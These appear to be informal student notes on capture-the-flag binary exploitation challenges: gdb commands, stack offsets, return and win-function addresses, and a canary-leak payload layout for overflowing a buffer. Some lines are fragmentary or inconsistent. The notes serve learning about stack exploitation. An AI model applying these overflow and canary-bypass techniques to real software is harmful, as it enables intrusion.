Best security:
Need to over flow the buf and write to var_11 as "12345678"

in hex it is:

31 32 33 34 35 36 37 38

In big endian it is
0x3132333435363738

Little endian it is:

buff size = 0x87

var11 is at 0x7ffd533b0e27.
rbp = 0x7ffd533b0e30
rbp = 0x7ffd533b0da0

commands:
x/20xg $rsp

set disassembly-flavor intel

Blind:
this is the ret addr to:
0x0000000000401215
x/10xg $rbp

jump:
this is the ret addr to:
0x00000000004012ce
x/10xg $rbp

stack-dump:
p prints the address at 0x0000 7fff ffff d888

0x00007fffffffd890

The win function is at:
0x00000000004012f6    36 FUNC    GLOBAL DEFAULT   15 win

000000000040148f                        fread(&buffer_64bit, 1, (int64_t)atoi(&buffer_64bit), stdin);
This puts the size of len = atoi(&buffer_64bit) into the buffer_64bit[48]

00000000004012f6    36 FUNC    GLOBAL DEFAULT   15 win
stack frame size is 0x7fffffffd930 - 0x7fffffffd8d0 = 96 bytes

The canary is at: rbp - 0x18
qword [rbp-0x18 {var_20}]   , rax
buffer is at  =>   sub    rsp, 0x58
offset from leaked address to stack canary is:
(0x7fffffffd918 - 0x7fffffffd8d7) = 65 bytes
(canary) - leaked_addr

(gdb) x/2gx $rbp
0x7fff5b781290: 0x00007fff5b7812b0      0x0000000000401598
(gdb) x/14gx $rsp

The input case  used to add the address of the canary and leak it!

Then the dump case used to leak the canary

then read the contents of the canary

and create payload

padding + le_can + padding_to_ret_addr + win_addr
56 + canary + 24 + 8
--------------------------

Upload your best guess of what the original code is

Please submit a C file with C code in it.

Note: You must supply readable and useful variable names, and the most concise version of the code possibe.
